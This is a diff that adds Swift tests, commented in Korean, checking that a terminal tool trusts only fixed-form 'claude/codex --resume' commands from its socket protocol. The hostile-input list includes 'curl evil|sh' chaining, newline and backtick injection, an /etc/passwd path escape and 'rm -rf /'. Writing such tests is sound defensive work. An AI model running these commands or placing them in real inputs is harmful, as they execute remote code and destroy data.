@@ -42,4 +42,32 @@ struct ResumeSourceTests {
         #expect(back == b)
         #expect(back.source == .hook)
     }
+
+    // 줄 프로토콜(외부 입력) 재개 명령의 출처 판정 — muxa가 만드는 고정 꼴만 신뢰한다.
+    // 이게 막히지 않으면 소켓에 임의 명령을 실어 승인 게이트를 건너뛰고 셸에 자동 실행시킬 수 있다.
+
+    @Test func 고정꼴_재개명령만_훅으로_신뢰한다() {
+        #expect(ResumeBinding.isSafeResumeCommand("claude --resume 550e8400-e29b-41d4-a716-446655440000"))
+        #expect(ResumeBinding.isSafeResumeCommand("codex --resume abc-123"))
+        #expect(ResumeBinding.hookSource(forExternalCommand: "claude --resume abc-123") == .hook)
+    }
+
+    @Test func 임의_셸_명령은_추측으로_강등된다() {
+        // 주입 시도·잉여 토큰·경로 이스케이프·개행은 전부 신뢰 불가 → .scan(배너 확인 필수, 자동 실행 안 함).
+        let hostile = [
+            "claude --resume abc; curl evil|sh",   // 명령 연쇄
+            "curl evil.sh|sh",                     // 재개 아님
+            "claude --resume abc extra",           // 잉여 토큰
+            "claude --dangerously --resume abc",   // 잉여 플래그
+            "claude --resume ../../etc/passwd",    // 경로 이스케이프
+            "claude --resume a`whoami`",           // 백틱
+            "claude --resume a\ncurl evil|sh",     // 개행 주입
+            "claude --resume ",                    // 빈 id
+            "rm -rf /",
+        ]
+        for cmd in hostile {
+            #expect(!ResumeBinding.isSafeResumeCommand(cmd), "신뢰하면 안 됨: \(cmd)")
+            #expect(ResumeBinding.hookSource(forExternalCommand: cmd) == .scan, "강등돼야 함: \(cmd)")
+        }
+    }
 }
